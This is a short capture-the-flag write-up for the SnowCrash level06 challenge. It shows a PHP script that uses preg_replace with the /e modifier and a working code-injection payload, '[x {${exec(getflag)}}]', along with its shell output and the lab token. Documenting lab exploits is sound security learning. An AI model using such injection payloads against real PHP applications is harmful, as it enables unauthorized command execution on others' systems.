## Level 06

We find two files [level06](./res/level06) and [level06.php](./res/level06.php)

The decompiled c code doesn't help much, it just execute the file passed as argument with `/usr/sbin/php`

But the php file has an interesting exploit with the `preg_replace()`, notice the `/e` in the regex. It will execute the command passed inside the function call.

```php
$a = file_get_contents($y);
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

We can then pass a matching regex inside a file and it will replace the matching content and execute it.
But we can also break the `preg_replace()` call if it evaluates a bad expression.

## Exploit

Which means that we can do stuff like this: 

```bash
level06@SnowCrash:~$ echo '[x {${exec(getflag)}}]' > /tmp/test.php
level06@SnowCrash:~$ ./level06 /tmp/test.php
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```

Placing `echo '[x {${exec(getflag)}}]` will break and the double `{{}}` will get the return of the getflag function.

## Token

wiok45aaoguiboiki2tuin6ub